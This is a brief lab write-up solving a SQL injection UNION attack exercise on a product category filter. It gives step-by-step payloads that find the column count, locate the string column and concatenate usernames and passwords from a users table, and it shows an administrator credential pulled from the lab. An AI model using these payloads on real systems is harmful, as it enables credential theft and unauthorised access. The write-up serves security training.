# Retrieving multiple values in a single column
## Description
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

### step 1
#### Determine the number of columns on both tables in order to use the UNION attack
'+order+by+1-- = response 200
'+order+by+2-- = response 200
'+order+by+3-- = response 500 

##### analysis 
The table has 2 columns

### step 2 
####  Determine the data types of each columns 
'+UNION+SELECT+'abc',NULL-- = response 500
'+UNION+SELECT+NULL,'abc'-- = response 200

##### Analysis
The second column is of string data type.

### step 3
#### Retriving the contents of the users table
'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- = response 200
results = administrator~nc1ne4hr8o19e8j8kmws

